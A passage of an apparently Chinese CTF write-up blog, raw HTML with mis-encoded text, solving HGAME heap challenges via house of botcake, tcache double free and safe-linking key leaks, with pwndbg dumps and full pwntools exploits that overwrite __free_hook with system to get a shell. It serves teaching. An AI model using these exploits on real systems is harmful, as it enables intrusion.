class="number">0x60</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">0x6</span>))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a>new_fast_note</h3><p><code>libc2.31</code>ä¸‹çš„<code>uaf</code>æ¼æ´ï¼Œæ— <code>edit</code>åŠŸèƒ½ï¼Œå…¶ä»–åŠŸèƒ½å’Œä¸Šè¿°ä¸€æ ·ã€‚ç”±äºå¼•å…¥äº†<code>tcache</code>ï¼Œè¿™é‡Œå­¦ä¹ äº†ä¸€ç§æ–°çš„<code>double free</code>åˆ©ç”¨æ‰‹æ³•<code>house of botcake</code>ã€‚<a href="https://www.cnblogs.com/brain-Z/p/16853137.html">å‚è€ƒæ–‡ç« </a></p><ul><li>åˆ†é…9ä¸ª<code>unsortedbin</code> å¤§å°çš„å †å—ï¼Œé‡Šæ”¾æ‰å‰7ä¸ªï¼Œå†ç”³è¯·ä¸€ä¸ªä¿æŠ¤å †å—é˜²æ­¢åˆå¹¶ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> â€”â–¸ <span class="number">0x563c55bf6570</span> â€”â–¸ <span class="number">0x563c55bf64e0</span> â€”â–¸ <span class="number">0x563c55bf6450</span> â€”â–¸ <span class="number">0x563c55bf63c0</span> â€”â–¸ <span class="number">0x563c55bf6330</span> â€”â–¸ <span class="number">0x563c55bf62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>é‡Šæ”¾æ‰ç¬¬9ä¸ªå †å—ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> â€”â–¸ <span class="number">0x563c55bf6570</span> â€”â–¸ <span class="number">0x563c55bf64e0</span> â€”â–¸ <span class="number">0x563c55bf6450</span> â€”â–¸ <span class="number">0x563c55bf63c0</span> â€”â–¸ <span class="number">0x563c55bf6330</span> â€”â–¸ <span class="number">0x563c55bf62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6710</span> â€”â–¸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x563c55bf6710</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><ul><li>é‡Šæ”¾æ‰ç¬¬8ä¸ªå †å—ï¼Œè§¦å‘<code>unsortedbin consolidate</code>åˆå¹¶ä¸ºä¸€ä¸ªå¤§å †å—ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> â€”â–¸ <span class="number">0x563c55bf6570</span> â€”â–¸ <span class="number">0x563c55bf64e0</span> â€”â–¸ <span class="number">0x563c55bf6450</span> â€”â–¸ <span class="number">0x563c55bf63c0</span> â€”â–¸ <span class="number">0x563c55bf6330</span> â€”â–¸ <span class="number">0x563c55bf62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6680</span> â€”â–¸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x563c55bf6680</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x563c55bf6680</span></span><br><span class="line"><span class="number">0x563c55bf6680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000121</span></span><br><span class="line"><span class="number">0x563c55bf6690</span>:<span class="number">0x00007fe8d8e26be0</span><span class="number">0x00007fe8d8e26be0</span></span><br><span class="line"><span class="number">0x563c55bf66a0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66b0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66c0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66d0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66e0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66f0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6700</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6710</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x563c55bf6720</span>:<span class="number">0x00007fe8d8e26be0</span><span class="number">0x00007fe8d8e26be0</span></span><br><span class="line"><span class="number">0x563c55bf6730</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6740</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6750</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6760</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure><ul><li>ç”³è¯·ä¸€ä¸ªå †å—(Tcacheä¼˜å…ˆ)ï¼Œå†é‡Šæ”¾æ‰ç¬¬9ä¸ªå †å—ï¼Œæ­¤æ—¶ä¸¤ä¸ªæŒ‡é’ˆåˆ†åˆ«ä½äº<code>unsortedbin</code>ä¸­å’Œ<code>tcache</code>ä¸­ï¼Œå®Œæˆäº†<code>double free</code>ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6720</span> â€”â–¸ <span class="number">0x563c55bf6570</span> â€”â–¸ <span class="number">0x563c55bf64e0</span> â€”â–¸ <span class="number">0x563c55bf6450</span> â€”â–¸ <span class="number">0x563c55bf63c0</span> â€”â–¸ <span class="number">0x563c55bf6330</span> â€”â–¸ <span class="number">0x563c55bf62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6680</span> â€”â–¸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x563c55bf6680</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>åªéœ€ç”³è¯·ä¸€ä¸ªæ¯”ç¬¬9ä¸ªå †å—å¤§çš„å †å—ï¼Œä¾¿èƒ½åˆ‡å‰²<code>unsortedbin</code>ï¼Œåœ¨ç¬¬9ä¸ªå †å—å¤„çš„<code>fd</code>æŒ‡é’ˆç•™ä¸‹<code>__free_hook</code>å³å¯ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6720</span> â€”â–¸ <span class="number">0x7fe8d8e28e48</span> (__free_hook) â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6730</span> â€”â–¸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x563c55bf6730</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>ç”³è¯·åˆ°<code>__free_hook</code>ä¸º<code>system</code>ï¼Œé‡Šæ”¾æ•°æ®ä¸º<code>/bin/sh</code>çš„å †å—å³å¯ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">30439</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">&#x27;protectt&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">112</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0xa0</span>,p64(free_hook)*<span class="number">20</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>,p64(system))</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">io.interactive()      </span><br></pre></td></tr></table></figure><h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><h2 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn"></a>pwn</h2><h3 id="libc-2-32é¢„å¤‡çŸ¥è¯†"><a href="#libc-2-32é¢„å¤‡çŸ¥è¯†" class="headerlink" title="libc-2.32é¢„å¤‡çŸ¥è¯†"></a>libc-2.32é¢„å¤‡çŸ¥è¯†</h3><ul><li>å¼•å…¥äº†<code>-safe-linking(å¼‚æˆ–åŠ å¯†)</code>æœºåˆ¶ï¼Œå…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šå°†<strong>æŒ‡é’ˆçš„åœ°å€</strong>å³ç§»12ä½å†å’Œ<strong>æŒ‡é’ˆæœ¬èº«</strong>å¼‚æˆ–ï¼Œè¯¥æ“ä½œåœ¨å †å—<strong>è¿›å…¥å’Œé€€å‡º</strong><code>tcache bin</code>æ—¶è¿›è¡Œï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><ul><li><code>chunk</code>æ”¾å…¥<code>tcache bin</code>æ—¶ï¼Œå…¶<code>fd</code>æŒ‡é’ˆä¼šè¿›è¡Œ<code>å¼‚æˆ–åŠ å¯†</code>ï¼Œå…¶<code>bk</code>æŒ‡é’ˆä¼šæ”¾å…¥<code>tcache</code>ï¼Œä»¥é˜²<code>double free</code>ã€‚</li><li><code>chunk</code>ä»<code>tcache bin</code>è¢«å–å‡ºæ—¶ï¼Œå…¶<code>fd</code>æŒ‡é’ˆè¿›è¡Œ<code>åå¼‚æˆ–æ“ä½œ</code>ï¼Œå…¶<code>bk</code>æŒ‡é’ˆæ¸…é›¶ã€‚</li><li>ä»¥ä¸‹å›¾ä¸ºä¾‹äº†è§£<code>-safe-linking</code>ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/162275/25/34595/91544/63d209b1F634efe7f/8e1d58f50172a469.png" style="zoom:80%;" /><ul><li>å½“ç¬¬ä¸€ä¸ª<code>chunk</code>è¿›å…¥<code>tcache bin</code>æ—¶ï¼Œç”±äº<code>tcache</code>æ­¤æ—¶ä¸ºç©ºï¼Œæ•…<code>fd = (0x559f965652a0 &gt;&gt; 12) ^ 0</code>ã€‚</li><li>å½“ç¬¬äºŒä¸ª<code>chunk</code>è¿›å…¥<code>tcache bin</code>æ—¶ï¼Œ<code>fd = (0x559f965652a0 &gt;&gt; 12) ^ 0x559f965652a0</code>ã€‚</li><li>ç¬¬ä¸‰ä¸ªåŒç†ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965652a0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;0x559f96565&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965652a0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0x559f965652a0</span>)</span><br><span class="line"><span class="string">&#x27;0x559acfaf37c5&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965653c0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0x559f96565330</span>)</span><br><span class="line"><span class="string">&#x27;0x559acfaf3655&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>ä¸éš¾æƒ³åˆ°<code>(0x559f965652a0 &gt;&gt; 12)</code>å°±æ˜¯ç¬¬ä¸€æ¬¡<code>free chunk</code>çš„<code>fd</code>æŒ‡é’ˆï¼Œä¸€ç›´å‚ä¸å¼‚æˆ–ï¼Œè¿™ä¹Ÿæ˜¯æœ‰äº›å¸ˆå‚…ä»¬å¸¸è¯´çš„<code>key</code>ã€‚</li></ul><h3 id="safe-note"><a href="#safe-note" class="headerlink" title="safe_note"></a>safe_note</h3><p><code>libc-2.32</code>ç¯å¢ƒä¸‹å¸¦æœ‰<code>edit</code>åŠŸèƒ½çš„<code>uaf</code>æ¼æ´é¢˜ç›®ï¼Œé™¤äº†ç¯å¢ƒä¸åŒï¼Œå…¶ä½™åŠŸèƒ½å‡ä¸<code>WEEK2-pwn-editable_note</code>ä¸€è‡´ã€‚</p><ul><li>ç”³è¯·9ä¸ª<code>0x80</code>å¤§å°å †å—ï¼Œé‡Šæ”¾7ä¸ªè£…æ»¡<code>tcache bin</code>ï¼Œå†é‡Šæ”¾ä¸€ä¸ªè¿›å…¥<code>unsorted bin</code>ï¼Œæ³„éœ²<code>libc_base</code>å³å¯ã€‚<strong>æ³¨ï¼šputså‡½æ•°å¯èƒ½è¢«ä½ä½â€˜\x00â€™æˆªæ–­ï¼Œå¯ä»¥ç”¨editè¿›è¡Œè°ƒæ•´ã€‚</strong></li><li>æ³„éœ²ç¬¬ä¸€ä¸ª<code>free chunk</code>çš„<code>fd</code>æŒ‡é’ˆå³<code>key</code>ï¼Œå°†<code>key</code>ä¸<code>__free_hook</code>å¼‚æˆ–ï¼ŒåŠ å¯†ç»“æœåœ¨å–å‡ºæ—¶ä¾¿ä¼šå¾—åˆ°çœŸå®çš„<code>__free_hook</code>åœ°å€ã€‚</li><li>ä¿®æ”¹ç¬¬ä¸ƒä¸ª<code>free_chunk</code>çš„<code>fd</code>æŒ‡é’ˆä¸º<code>__free_hook</code>åŠ å¯†ç»“æœï¼Œå†ç”³è¯·ä¸¤æ¬¡å †å—å¾—åˆ°<code>__free_hook</code>åœ°å€çš„æ§åˆ¶æƒï¼Œå†™å…¥<code>system</code>å³å¯ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-3.hgame.lwsec.cn&quot;</span>,<span class="number">30852</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12</span>-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span 